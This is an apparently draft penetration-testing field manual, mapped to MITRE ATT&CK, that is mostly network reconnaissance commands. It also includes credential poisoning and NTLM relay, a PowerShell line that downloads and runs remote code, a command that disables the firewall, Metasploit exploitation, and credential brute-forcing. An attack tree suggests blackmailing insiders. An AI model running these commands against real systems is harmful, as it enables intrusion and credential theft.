

<!-- MarkdownTOC depth=3 autolink=true -->

- [Operational Considerations](#operational-considerations)
    - [Goals](#goals)
    - [Operation Planning](#operation-planning)
    - [Toolbox](#toolbox)
- [Tactical Objectives](#tactical-objectives)
    - [Ops-Sec Considerations](#ops-sec-considerations)
    - [Attack Infrastructure](#attack-infrastructure)
    - [Getting Access](#getting-access)
    - [Discovery](#discovery)
    - [Credential Access](#credential-access)
    - [Lateral Movement](#lateral-movement)
- [Techniques: Ops-Sec Considerations]
- [Techniques: Attack Infrastructure]
- [Techniques: Getting Access]
- [Techniques: Discovery](#techniques-discovery)
    - [Passive techniques](#passive-techniques)
    - [Active Reconnaissance](#active-reconnaissance)
        - [Scanning: TCP](#scanning-tcp)
        - [Scanning: UDP](#scanning-udp)
        - [DNS queries](#dns-queries)
        - [Protocols-specific broadcasts/multicasts](#protocols-specific-broadcastsmulticasts)
    - [Identifying Core Network Technologies](#identifying-core-network-technologies)
    - [Understanding Network Topology](#understanding-network-topology)
    - [Services Discovery](#services-discovery)
    - [HTTP/HTTPS Services Discovery](#httphttps-services-discovery)
- [Techniques: Credential Access](#techniques-credential-access)
- [Techniques: Lateral Movement](#techniques-lateral-movement)
    - [Flawed Network Equipment](#flawed-network-equipment)
    - [Flawed Remote Services](#flawed-remote-services)
        - [SMB](#smb-service)
        - [RDP](#rdp-service)
        - [MS-SQL](#ms-sql-service)
        - [WinRM](#winrm)
        - [Other Windows services](#other-windows-services)
        - [SNMP](#snmp-service)
        - [SMTP](#smtp-service)
    - [Flawed HTTP/HTTPS Remote Services](#flawed-httphttps-remote-services)
        - [Apache Tomcat: default/weak credentials](#apache-tomcat-defaultweak-credentials)
    - [Flawed embedded devices](#flawed-embedded-devices)

<!-- /MarkdownTOC -->

# Security Testing Field Manual

Introduction and purpose.

# Operational Considerations

## Goals

List of possible goals.

## Operation Planning

```
1. Set goal(s): objectives to accomplish
2. Combine various tactics to achieve your operational goal(s)
3. Select appropriate tachniques (and choose suitable tools) to achieve your tactical goals
```

## Toolbox

# Tactical Objectives

## Ops-Sec Considerations

MITRE PRE-ATT&CK: [TA0021](https://attack.mitre.org/tactics/TA0021/)

## Attack Infrastructure

MITRE PRE-ATT&CK: [TA0022](https://attack.mitre.org/tactics/TA0022/)

## Getting Access

*Tactical goal: get IP address in target's internal network*

MITRE ATT&CK: [TA0001](https://attack.mitre.org/tactics/TA0001/)

Possible techniques (in a form of attack tree):

```
1. [OR] (remote) Social Engineering
1.1. [OR] Delivery of phishing email/message
1.1.1. Malicious link (T1192)
1.1.2. Malicious attachment (T1193)
1.1.3. Malicious social media message (T1194)
1.2. Drive-by compromise (T1189)
1.3. [OR] "Tasking" insider to plant connect-back implant
1.3.1. by fooling him (e.g. run it for me; print doc from this USB)
1.3.2. by bribing him
1.3.3. by blackmailing him
1.3.4. by "embedding" him first into target company
1.4. Fooling insider to reveal his credentials (T1078)
...

2. [OR] Breaching the perimeter/DMZ
2.1. Exploit Public-Facing Application (T1190)
2.2. Exploit remote access mechanism (T1133)
...

3. [OR] Close access operations
3.1. Hacking into wireless network
3.2. Using USB drive drops (T1091)
3.3. [OR] Breaching physical perimeter
3.3.1. Plant drop-in device and plug it into network
3.3.2. Plant USB device and plug it to existing machine
...

4. [OR] Exploiting Trusted Relationship (T1199)
4.1. [OR] Hack 3rd party entity that delivers service to target (T1195)
4.1.1. Open source Software supplier 
4.1.2. Commercial Software supplier 
4.1.3. Hack company that provides services to the target
4.1.4. Hack target's contractor worker
4.2. [AND] Hack "to be acquired" company
4.2.1. Get knowledge about near aquisitions
4.2.1. Hack the company that is going to be acquired 
4.3. [AND] Build trust relationship with the target
4.3.1. Work as a contractor for the target
4.3.2. Exploit the trust that was built
...
```

## Discovery

*Tactical goal: Understand the target environment*

MITRE ATT&CK: [TA0007](https://attack.mitre.org/tactics/TA0007/)

Questions that should be asked:

```
What's the network topology? Is it flat?
Where are egress points?
Where are "multi-homed" boxes?
```

## Credential Access

*Tactical goal: Acquire valid set of credentials*

MITRE ATT&CK: [TA0006](https://attack.mitre.org/tactics/TA0006/)

## Lateral Movement

MITRE ATT&CK: [TA0008](https://attack.mitre.org/tactics/TA0008/)

# Techniques: Discovery

## Passive techniques

MITRE ATT&CK: [T1040](https://attack.mitre.org/techniques/T1040/)

Sniffing:

```
# {broad,multi}cast traffic excluding ARP:
tcpdump -nn -i eth0 -w tcpdump-b-m-no-arp.pcap ether broadcast and ether multicast and not arp

# Sniffs the network for incoming broadcast communication and attempts to decode the received packets.
# https://nmap.org/nsedoc/scripts/broadcast-listener.html
nmap --script broadcast-listener -e eth0 --script-args=broadcast-listener.timeout=30

# Overview of IPv4 traffic:
tcpdump -i eth0 -w session1-all-ipv4.pcap -nn not ip6 and not port 22
# Full packet capture of IPv4 traffic:
tcpdump -X -s0 -i eth0 -w session1-all-ipv4-full-content.pcap -nn not ip6 and not port 22

# Overview of IPv6 traffic:
tcpdump -i eth0 -w session1-all-ipv6.pcap -nn ip6
# Full packet capture of IPv6 traffic:
tcpdump -i eth0 -w session1-all-ipv6-full-content.pcap -nn ip6
```

OS fingerprinting:

```
# Linux
responder -I eth0 -A -f

# Windows
Invoke-Inveigh -IP <current-box-ip> -ConsoleOutput Y -Inspect Y

TODO:
p0f
```

Discovery of 'hidden' (i.e. all ports filtered, no ping replies) hosts:

```
# IPs seen be responder:
cut -d' ' -f9 Responder/logs/Analyzer-Session.log | sort -u
cut -d' ' -f12 Responder/logs/Responder-Session.log | sort -u

# IPs seen by tcpdump:
tcpdump -nn -r <SESSION_FILE> -l | grep -o -E '[0-9]+(\.[0-9]+){3}' | sort -u

# verify if it is already in discovered hosts ('hostsUp.txt') file:
grep -v -f hostsUp.txt <(process returning IP list)
```

## Identifying Core Network Technologies

Reference:

```
https://en.wikipedia.org/wiki/List_of_Microsoft_Windows_versions
```

LAN ARP scan to get an idea of network equipment's vendors (based on MAC):

```
nmap -n -sn -PR 192.168.0.0/24 | grep -E -v 'Host is up|Starting Nmap|Nmap done:' | while read -r ip; do read -r mac; echo -e "IP: $(cut -d' ' -f5 <<< $ip);\t $mac"; done
```

## Active Reconnaissance

### Scanning: TCP

MITRE ATT&CK: [T1018](https://attack.mitre.org/techniques/T1018/)

Reference:

```
https://nmap.org/book/host-discovery.html
https://nmap.org/book/man-host-discovery.html
https://nmap.org/book/nping-man-briefoptions.html
```

Prereq:

 - [observer.sh](scripts/observer.sh)

Objectives:

```
In:
IP-ranges.txt - file with IPs in scope

Out:
hostsUp.txt - initial list of alive IPs discovered in tested scope
allPorts.txt - initial list of port numbers that were seen opened in tested scope
```

One-time host sweeps:

```
# ping (ICMP echo request) sweeps:
for i in $(seq 1 254); do ping -c1 192.168.1.$i | grep 'time=' | cut -d" " -f4 | cut -d":" -f1 & done
nmap -sn 192.168.1.1-254 -oG - -PE

# host discovey (default):
nmap -n -sn == ICMP echo request,
               TCP SYN to port 443,
               TCP ACK to port 80,
               ICMP timestamp request
nmap -n -sn -T4 -iL IP-ranges.txt

# comprehensive (can be slow for huge networks) (could add: --source-port 53):
nmap -n -sn -T4 -PE -PS21,22,23,25,80,113,31339 -PA80,113,443,10042 -iL IP-ranges.txt
```

One-time, fast scan for detecting of first batch of alive hosts:

```
# initial scan:
nmap -n -PN -sS -iL IP-ranges.txt -T4 --open -F -oA pscans/all-fast-onetime

# alternative for larger networks:
nmap -n -PN -sS -iL IP-ranges.txt -T4 --open --top-ports 50 -oA pscans/all-fast-onetime

# store initial list of alive hosts and ports that have been observed as opened:
./gnxparse.py -p pscans/all-fast-onetime.xml | grep -v 'Port' > allPorts.txt
./gnxparse.py -ips pscans/all-fast-onetime.xml | grep -v 'IPv4' > hostsUp.txt
```

Long-run "scanning jobs" with frequent updates of results at `pscans/`:

```
# Continuous, randomized, full IP space, full port range scan jobs with small host groups (for frequent update of results): 
nmap -n -PN -sS -iL IP-ranges.txt -T4 --open -p- -oA pscans/all-full-rand-job-1 --randomize-hosts --max-hostgroup 4

# scan 'rawr' ports (where 'rawrPorts' is Bash function returning list of rawr ports):
nmap -n -Pn -sS --open -iL IP-ranges.txt -p$(rawrPorts) -oA pscans/all-rawrPN -T4 --max-hostgroup 16

# full scope - next top 3000 ports (in batches of 100 ports):
screen /bin/bash -c 'for i in $(seq 1 30); do masscan -iL IP-ranges.txt -p$(topNports 100 $((i*100))) --rate 1000 -oX pscans/masscan-offset$((i*100))-top100.xml; done'

# full port range scan of already discovered hosts:
nmap -n -sS --open -iL hostsUp.txt -p- -oA pscans/hostsUp-all -T4 --max-hostgroup 16
```

Periodical runs based on the (incremental) findings at `pscans/`:

```
# fetch newly discovered ports and hosts from 'pscans/':
./observer.sh pscans/

# full IP space scan of previously seen (and not yet 'horizontally' scanned) ports:
nmap -n -Pn -sS --open -iL IP-ranges.txt -p$(cat allPorts.txt | tr '\n' ',') -oA pscans/all-deltaPorts-$(date +%F_%H-%M) -T4
# OR (only specific delta):
nmap -n -Pn -sS --open -iL IP-ranges.txt -p$(cat vscans/delta-ports-* | tr '\n' ',') -oA pscans/all-deltaPorts-$(date +%F_%H-%M) -T4

# full port range scan of previously discovered (and not yet fully scanned) hosts:
nmap -n -sS --open -iL vscans/delta-hosts-* -p- -oA pscans/deltaHosts-all-$(date +%F_%H-%M) -T4'
```

### Scanning: UDP

Prereq:

```
https://raw.githubusercontent.com/portcullislabs/udp-proto-scanner/master/udp-proto-scanner.conf
https://raw.githubusercontent.com/portcullislabs/udp-proto-scanner/master/udp-proto-scanner.pl
```

Probing for popular UDP-based services:

```
ranges2IPs IP-ranges.txt > IP-list.txt
udp-proto-scanner.pl --file IP-list.txt | tee all-udp-proto-scanner.out
```

Nmap UDP scan:

    nmap -n -sU --top-ports 500 -PN --open --reason -T4 -iL IP-ranges.txt -oA udp-all-fast-pscan

### DNS queries

Reverse DNS:

```
nmap -R -sL -T4 -iL IP-ranges.txt | sort -k 5.1
```

DNS brute-force:

```
TODO
```

### Protocols-specific broadcasts/multicasts

```
# discovery of additional network devices via multicasting / broadcasting
nmap --script mrinfo -e ens160 -d
nmap -sU -p 5351 --script=nat-pmp-info 10.10.10.0/24 -d --open
nmap --script broadcast-pim-discovery -e ens160 -d --script-args 'broadcast-pim-discovery.timeout=15'
nmap --script='broadcast-eigrp-discovery,broadcast-igmp-discovery,broadcast-ospf2-discover' -e ens160 --script-args 'broadcast-igmp-discovery.version=all, broadcast-igmp-discovery.timeout=13' -d

TODO:
https://nmap.org/nsedoc/scripts/wsdd-discover.html
https://nmap.org/nsedoc/scripts/targets-ipv6-multicast-echo.html
https://nmap.org/nsedoc/scripts/targets-ipv6-multicast-invalid-dst.html
https://nmap.org/nsedoc/scripts/targets-ipv6-multicast-mld.html
https://nmap.org/nsedoc/scripts/targets-ipv6-multicast-slaac.html
```

## Understanding network topology

MITRE ATT&CK: N/A

Summary of alive hosts/devices per subnet:

```
In:
IP-ranges.txt - file with IP ranges in scope
pscans/*.xml - all hosts discovered so far

Out:
hostsUp-${i}.0.txt - file per each subnet with alive IPs

# version for /24 subnets
for i in $(cat IP-ranges.txt | cut -d'.' -f1,2,3); do echo "### Network $i.0 ###";  grep "$i" <(for f in $(ls pscans/*.xml); do ./gnxparse.py -ips $f 2>/dev/null; done) | sort -u -t '.' -k 4.1g | tee "hostsUp-${i}.0.txt"; done

# version for /16 subnets
for i in $(cat IP-ranges16.txt | cut -d'.' -f1,2); do echo "### Network $i.0.0 ###";  grep "$i" <(for f in $(ls pscans/*.xml); do ./gnxparse.py -ips $f 2>/dev/null; done) | sort -u -t '.' -k 4.1g | tee "hostsUp-${i}.0.0.txt"; done
```

Visualising network topology (for brevity displaying only 5 random alive hosts per subnet):

```
In:
IP-ranges.txt - file with IP ranges in scope
pscans/all-fast-onetime.nmap - result of full range fast (-F) scan

for i in $(cat IP-ranges.txt | cut -d'.' -f1,2,3); do grep "$i" <(for f in $(ls pscans/*.xml); do ./gnxparse.py -ips $f 2>/dev/null; done) | sort -u -t '.' -k 4.1g | shuf -n 5 -; done | tee 5hosts-persubnet.txt

# no host discovery, no scans just (ICMP) traceroute:
nmap -n -T4 -PN -sn --traceroute -iL 5hosts-persubnet.txt -oX netTopologyICMP.xml

# alternatives (TCP or UDP based) tracerouting:
# Comment:
# top 100 port scan is performed (-F)
# Nmap will initiate (TCP / UDP based) traceroute
# only if at least one of scanned ports are opened
# if not it will fallback to ICMP traceroute
nmap -PN -sS -n -F -T4 -iL 5hosts-persubnet.txt --traceroute --open -oX netTopologyTCP.xml
nmap -PN -sU -n -F -T4 -iL 5hosts-persubnet.txt --traceroute --open -oX netTopologyUDP.xml
# TCP and UDP combined. Scans top 16 TCP ports and 16 UDP ports, falls back to ICMP if scanned ports are closed:
nmap -PN -sUS -n --top-ports 16 -T4 -iL 5hosts-persubnet.txt --traceroute --open -oX netTopologyTCP-UDP.xml

zenmap netTopology{ICMP,TCP,UDP,TCP-UDP}.xml
```

## Services discovery

MITRE ATT&CK: [T1046](https://attack.mitre.org/techniques/T1046/)

Objectives:

```
In:
hostsUp.txt - list of alive IPs discovered in tested IP space
allPorts.txt - ports seen opened in tested IP space

Out:
hostsUp-vscan.{nmap,gnmap,xml} - nmap's initial enumeration (`-A`) of all servies in scope
```

Initial vuln scan:

```
nmap -n -sUS -A --script=vulners --open -iL hostsUp.txt -p$(cat allPorts.txt | tr '\n' ',') -oA vscans/base-vscan -T4 --max-hostgroup 16
```

Additional scans after discovering new hosts:

```
nmap -n -Pn -sUS -A --script=vulners --open -iL vscans/delta-hosts-* -p$(cat allPorts.txt | tr '\n' ',') -oA vscans/base-delta-hosts-$(date +%F_%H-%M) -T4
```

Additional scans after discovering new ports:

```
nmap -n -Pn -sUS -A --script=vulners --open -iL IP-ranges.txt -p$(cat vscans/delta-ports-* | tr '\n' ',') -oA vscans/base-delta-ports-$(date +%F_%H-%M) -T4
```

Merge results:

```
for i in $(ls vscans/*.xml); do echo -n "$i,"; done | head -c -1 |  xargs ./gnxmerge.py -s | tee vscans/vscanlatest-$(date +%F_%H-%M).xml
```

## HTTP/HTTPS Services Discovery

Prereq:

 - [gnmap2urls.sh](scripts/gnmap2urls.sh)
 - Arch / Kali: `extra/xorg-server-xvfb / xvfb` package
 - [httprobe](https://github.com/tomnomnom/httprobe/releases/latest)
 - [Aquatone](https://github.com/michenriksen/aquatone/releases/latest) OR [webscreenshot.py](https://github.com/maaaaz/webscreenshot)
 - [OPTIONALLY] [Eyeballer](https://github.com/bishopfox/eyeballer)

Identifying web-based services:

```
TODO: httprobe
```

Visual discovery of interesting web-based applications:

```
gnmap2urls.sh all-vulnScan.out.gnmap | tee urls0.txt

python webscreenshot.py -v -r chromium --no-xserver -i ../urls0.txt
OR
cat urls0.txt | ./aquatone -threads 5 -out aquatone-IPs.out/
```

## AD discovery

In-depth domain recon:

```
https://adsecurity.org/?p=2535
https://speakerdeck.com/ropnop/fun-with-ldap-kerberos-and-msrpc-in-ad-environments?slide=96
```

Domain recon (from Windows box):

```
https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/master/Recon/PowerView.ps1
https://pentestlab.blog/2018/05/28/situational-awareness/
```

# Techniques: Credential Access

## MitM

Classic Responder LLMNR/mDNS/NBNS poisonning:

```
# most lightweight version: poisonning + capturing requests only to SMB
Responder.py -I eth0 -f

# as aobove + acting as WPAD web proxy
Responder.py -I eth0 -wrf

# also forces users to provide their creds on WPAD
Responder.py -I eth0 -wfFbv
```

PowerShell ADIDNS/LLMNR/mDNS/NBNS poisonning:

```
# details:
# https://github.com/Kevin-Robertson/Inveigh/
# https://github.com/Kevin-Robertson/Inveigh/wiki/Basics
Invoke-WebRequest -Uri https://github.com/Kevin-Robertson/Inveigh/archive/Inveigh-master.zip -OutFile Inveigh-master.zip

OR (how's this differnet?):

# downloading Inveigh in PowerShell and loading it into memory with:
IEX (New-Object Net.WebClient).DownloadString("https://raw.githubusercontent.com/Kevin-Robertson/Inveigh/master/Inveigh.ps1")

# unzip (when .NET Framework 4.5 is available):
[System.Reflection.Assembly]::LoadWithPartialName('System.IO.Compression.FileSystem')
[System.IO.Compression.ZipFile]::ExtractToDirectory(".\Inveigh-master.zip", ".\Inveigh-master")

# source your PS scripts
cd .\Inveigh-master; cd .\Inveigh-master; . .\Inveigh.ps1

# turn off win firewall (also antivirus should be turned off or evaded):
netsh advfirewall set  allprofiles state off

# run in poisoning mode (Needs PS console with admin privs):
Invoke-Inveigh -IP <current-box-ip> -ConsoleOutput Y -NBNS Y -LLMNR Y -mDNS Y -HTTPS Y -Proxy Y -FileOutput Y

# run in limited poisoning mode (no admin privs):
Invoke-Inveigh -IP <current-box-ip> -ConsoleOutput Y -NBNS Y -FileOutput Y

# to stop:
Stop-Inveigh
```

NetNTLM creds relay (prereq: SMB signing needs to be turned off):

Check: `nmap --script smb-security-mode.nse -p445,139 192.168.12.0/24 --open`

With Inveigh (provides NTLMv1/NTLMv2 HTTP/HTTPS/Proxy to SMB2.1 relay):

```
# we don't launch listener on HTTP as Invoke-InveighRelay will listen on it
Invoke-Inveigh -IP <current-box-ip> -ConsoleOutput Y -NBNS Y -LLMNR Y -mDNS Y -HTTP N

# Prepare command to execute (e.g. launcher for C2 Empire):
see below: Empire as C&C

# launch Relay (as cmd provide launcher command form Empire):
Invoke-InveighRelay -ConsoleOutput Y -StatusOutput N -Target <ip-to-relay-to> -Command <cmd-to-execute>
```

With Responder:

    https://threat.tevora.com/quick-tip-skip-cracking-responder-hashes-and-replay-them/

Other tools:

```
https://www.fox-it.com/en/insights/blogs/blog/inside-windows-network/
https://github.com/SecureAuthCorp/impacket
```

# Techniques: Lateral Movement

## Flawed Network Equipment

MITRE ATT&CK: N/A

```
# looking for telnet, SNMP, TFTP, Cisco 'SIET' port (4786)
sudo nmap -n -Pn -sS -sU -pT:23,69,4786,4001,U:161,162 -iL scope.txt -T4 --open -oG network-devices.out
cat network-devices.out | grep -v '161/open|filtered/udp//snmp///' | grep -v '162/open|filtered/udp//snmptrap///' | grep -v 'Status: Up' > network-devices.txt

# look for SSH daemons with router/swich related banners
nmap -n -Pn -sS -T4 -p22 -iL scope.txt -oG - --open -sV --version-intensity 0 | grep -v 'Status: Up' | tee ssh-banners.out | grep -i cisco
also grep for: 
OpenSSH 12.1 - Palo Alto PA Firewall

# looking for devices web panels:
# (after masscan, only ports 80)
screen -d -m /bin/bash -c $'for i in $(cat masscan-allPorts.min | grep \':80$\'); do echo "$i:"; timeout 7s curl -s -L -k -I "http://$i"; done | tee http-headers.out'
# (from IP list only, only port 80)
while read i; do timeout 2s curl -s -w "%{remote_ip}" -L -I "http://$i" & done < hosts-fastTcp.txt > http-headers.out
while read i; do timeout 2s curl -s -w "%{remote_ip}" -L -k -I "https://$i" & done < hosts-fastTcp.txt > https-headers.out
screen /bin/bash -c 'while read i; do timeout 2s curl -s -w "%{remote_ip}" -L -k -I "https://$i" & done < hosts-fastTcp.txt > https-headers.out'
# (BEST: wth URLS list already generated)
screen -d -m /bin/bash -c 'while read i; do echo "$i:"; timeout 7s curl -s -L -k -I "$i"; done < urls.txt | tee http-headers.out'
then grep for: level_15_access|ios|cisco|level_15_or_view_access|level_1_or_view_access

# looking for TLS certificates CNs
wget https://gist.githubusercontent.com/mzet-/4c29137ab6b642f8f84d0fcd2f14403b/raw/088e89b21dbbcb49baefe1c7aa1590eeafc99a18/tlsScrape.sh
./tlsScrape.sh IP-ranges.txt

TODO: 
----
http://vulnerabilityassessment.co.uk/Penetration%20Test.html
find: Cisco Specific Testing


https://gitlab.com/kalilinux/packages/cisco-global-exploiter/raw/kali/master/cge.pl

https://gitlab.com/kalilinux/packages/cisco-auditing-tool/tree/kali/master

http://www.vulnerabilityassessment.co.uk/cisco.htm
-----
```

## Flawed Remote Services 

MITRE ATT&CK: T1021 / T1210

### SMB service: Exploitation

Ports:

    TCP: 139,445
    UDP: 137

Specifications:

    https://docs.microsoft.com/en-us/openspecs/windows_protocols/ms-cifs/
    https://docs.microsoft.com/en-us/openspecs/windows_protocols/ms-smb/

Discovery (directly from the wire):

```
nmap -sS -Pn -n -p445 -iL IP-ranges.txt -oG - --open | grep -E -v 'Nmap|Status' | cut -d' ' -f2 | tee smbServices.txt
```

Discovery (from previous scans):

```
python scripts/nparser.py -f vscanlatest -p445 -l | tee smbServices.txt
```

Additional enumeration:

```
nmap -n -sU -sS -Pn -pT:139,445,U:137 -sV --script=smb-os-discovery,smb-protocols,smb-security-mode,smb-system-info,smb2-capabilities,smb2-security-mode,smb2-time -iL smbServices.txt | tee vscans/smb-services-enumeration.out

Follow up:
https://nmap.org/nsedoc/scripts/smb-brute.html
https://nmap.org/nsedoc/scripts/smb-enum-domains.html
https://nmap.org/nsedoc/scripts/smb-enum-groups.html
https://nmap.org/nsedoc/scripts/smb-enum-processes.html
https://nmap.org/nsedoc/scripts/smb-enum-services.html
https://nmap.org/nsedoc/scripts/smb-enum-sessions.html
https://nmap.org/nsedoc/scripts/smb-enum-shares.html
https://nmap.org/nsedoc/scripts/smb-enum-users.html
```

Writable shares:

```
nmap -n --script=smb-enum-shares -p445 -iL smbServices.txt -oA vscans/smbEnumShares
```

Vulnerability: ms08-067

```
Reference: https://nmap.org/nsedoc/scripts/smb-vuln-ms08-067.html 
Affected: Windows Server 2000, Windows Server 2003, and Windows XP

Discovery:
nmap -sS -sU --script smb-vuln-ms08-067.nse -pT:445,139,U:137 -iL smb-services.txt --open -d | tee smb-vuln-ms08-067.out

Exploitation:
msf5 > use exploit/windows/smb/ms08_067_netapi
set RHOSTS <IP>
```

Vulnerability: ms10-054

```
Reference: https://nmap.org/nsedoc/scripts/smb-vuln-ms10-054.html
Notes: The script requires at least READ access right to a share on a remote machine.

Discovery:
nmap  -p 445 <target> --script=smb-vuln-ms10-054 --script-args unsafe -d
nmap -sS -sU --script smb-vuln-ms10-054.nse --script-args unsafe -pT:445,139,U:137 -iL smb-services.txt --open -d | tee smb-vuln-ms10-054.out
# grep for 'true' in smb-vuln-ms10-054.out
```

Vulnerability: ms10-06

```
Notes: 
Originally used by Stuxnet
In order for the check to work it needs access to at least one shared printer on the remote system
Reference: https://nmap.org/nsedoc/scripts/smb-vuln-ms10-061.html

Discovery:
nmap -sS -sU --script smb-vuln-ms10-061.nse -pT:445,139,U:137 -iL smb-services.txt --open -d | tee smb-vuln-ms10-061.out
```

Vulnerability: ms17-01

```
Notes:
EternalBlue (exploited by WannaCry)
Needs connection to IPC$ share
Tested on Windows XP, 2003, 7, 8, 8.1, 10, 2008, 2012 and 2016
Reference: https://nmap.org/nsedoc/scripts/smb-vuln-ms17-010.html

Discovery:
nmap -sS -sU --script smb-vuln-ms17-010 --max-hostgroup 3 -pT:445,139,U:137 -iL smb-services.txt --open -d | tee smb-vuln-ms17-010.out
```

### RDP service

```
TODO
```

### MS-SQL service

Ports:

    TCP: 1433
    UDP: 1434
    Other: https://docs.microsoft.com/en-us/sql/sql-server/install/configure-the-windows-firewall-to-allow-sql-server-access?view=sql-server-ver15

Reference:

```
https://nmap.org/nsedoc/lib/mssql.html
http://travisaltman.com/pen-test-and-hack-microsoft-sql-server-mssql/
```

Discovery:

```
# from the wire:
nmap -sS -Pn -n -p1433 -iL IP-ranges.txt -oG - --open | grep -E -v 'Nmap|Status' | cut -d' ' -f2 | tee mssqlServices.txt
udp-proto-scanner.pl --probe_name ms-sql <IPs>
nmap --script broadcast-ms-sql-discover

# from previous scans:
python nparser.py -f vscans/vscanlatest -p1433 -l | cut -d: -f1 |tee mssqlServices.txt
```

Basic enumeration:

    nmap -sS -Pn -n -p1433 -iL mssqlServices.txt --script ms-sql-info,ms-sql-ntlm-info

Check for empty passwords:

    nmap -p 1433 --script ms-sql-empty-password -iL mssqlServices.txt -v

Brute force attack:

    hydra -s 1433 -t 4 -T 8 -L ~/PAYLOADS/PASSWD/mssql-users.txt -P ~/PAYLOADS/PASSWD/mssql-passwds.txt -M mssqlServices.txt mssql

### WinRM service

### Other Windows services

Background:

    https://support.microsoft.com/en-us/help/832017/service-overview-and-network-port-requirements-for-windows

Discovery:

```
nmap -n -sU -sS -Pn -pT:135,139,445,5985,5986,47001,U:137 -T4 --open
```

### SNMP service

Ports:

    UDP: 161,162

Overview:

    https://en.wikipedia.org/wiki/Simple_Network_Management_Protocol

### SMTP service

Ports:

    TCP: 25,587,465

Implementations:

    https://en.wikipedia.org/wiki/List_of_mail_server_software#SMTP

Common misconfiguration: SMTP Open Relay

```
HELO ABC
MAIL FROM: foo@domain.com
RCPT TO: bar@domain.com
DATA
Testing for SMTP open relay issue.
.
QUIT
```

Noteworthy vulnerabilities:

```
```

## Flawed HTTP/HTTPS Services

MITRE ATT&CK: T1021 / T1210

### Apache Tomcat: default/weak credentials

```
Use auxiliary/scanner/http/tomcat_mgr_login
```

OR (if many different ports are used)
```
Prereq: Nmap scan results imported to msf

msf> services -S Coyote -c port -o /tmp/tomcat.csv
$ for i in $(cat /tmp/tomcat.csv | tr -d '"' | tr ',' ':'); do echo "http://$i/manager/html"; done > tomcat-urls.txt

$ wget https://raw.githubusercontent.com/netbiosX/Default-Credentials/master/Apache-Tomcat-Default-Passwords.mdown

$ cat Apache-Tomcat-Default-Passwords.mdown | tr -d ' ' | awk -F'|' '{print $2":"$3}' > PAYLOADS/tomcat-defaults.txt

$ while read line; do echo -n "$line : "; for i in $(cat PAYLOADS/tomcat-defaults.txt); do curl -H "Authorization: Basic $(echo -n "$i" | base64)" -s -o /dev/null -w "%{http_code}" --url "$line"; echo; done; done < tomcat-urls.txt > tomcats-results.txt
```

## Flawed embedded devices

```
TODO
```
